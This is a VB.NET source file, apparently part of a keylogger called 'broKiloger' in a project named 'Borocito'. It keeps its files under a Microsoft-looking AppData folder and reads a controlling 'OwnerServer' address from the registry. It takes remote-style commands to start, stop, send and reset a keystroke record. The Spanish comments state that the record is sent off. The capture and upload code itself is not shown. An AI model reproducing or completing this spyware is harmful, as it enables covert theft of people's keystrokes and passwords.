﻿Imports Microsoft.Win32
Module GlobalUses
    Public parameters As String
    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
    Public HttpOwnerServer As String
End Module
Module Utility
    Public tlmContent As String
    Sub AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False)
        Try
            Dim OverWrite As Boolean = False
            If My.Computer.FileSystem.FileExists(DIRCommons & "\" & My.Application.Info.AssemblyName & ".log") Then
                OverWrite = True
            End If
            Dim finalContent As String = Nothing
            If flag = True Then
                finalContent = " [!!!]"
            End If
            Dim Message As String = DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & finalContent & " [" & from & "] " & content
            tlmContent = tlmContent & Message & vbCrLf
            Console.WriteLine("[" & from & "]" & finalContent & " " & content)
            Try
                My.Computer.FileSystem.WriteAllText(DIRCommons & "\" & My.Application.Info.AssemblyName & ".log", vbCrLf & Message, OverWrite)
            Catch
            End Try
        Catch ex As Exception
            Console.WriteLine("[AddToLog@Utility]Error: " & ex.Message)
        End Try
    End Sub
End Module
Module Memory
    Public regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
    Public OwnerServer As String
    Public UID As String
    Sub SaveRegedit()
        Try
            AddToLog("SaveRegedit@Memory", "Saving data...", False)
            regKey.SetValue("UID", UID, RegistryValueKind.String)
            LoadRegedit()
        Catch ex As Exception
            AddToLog("SaveRegedit@Memory", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub LoadRegedit()
        Try
            AddToLog("LoadRegedit@Memory", "Loading data...", False)
            OwnerServer = regKey.GetValue("OwnerServer")
            UID = regKey.GetValue("UID")
            HttpOwnerServer = "http://" & OwnerServer
        Catch ex As Exception
            AddToLog("LoadRegedit@Memory", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module
Module StartUp
    Sub Init()
        AddToLog("Init", "broKiloger " & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")" & " has started! " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy"), True)
        Try
            'Cargamos los datos del registro de Windows
            LoadRegedit()
        Catch ex As Exception
            AddToLog("Init@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub ReadParameters(ByVal parametros As String)
        Try
            If parametros <> Nothing Then
                Dim parameter As String = parametros
                If parameter.ToLower Like "*/startrecording*" Then
                    'Comienza a registrar teclas
                    Main.StartRecording()

                ElseIf parameter.ToLower Like "*/stoprecording*" Then
                    'Detiene el registrador de teclas
                    Main.StopRecording()

                ElseIf parameter.ToLower Like "*/sendrecord*" Then
                    'envia el registro de teclas
                    Main.SendRecord()

                ElseIf parameter.ToLower Like "*/resetrecord*" Then
                    'limpia el registro de teclas
                    Main.ResetRecord()

                End If
            End If
        Catch ex As Exception
            AddToLog("ReadParameters@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module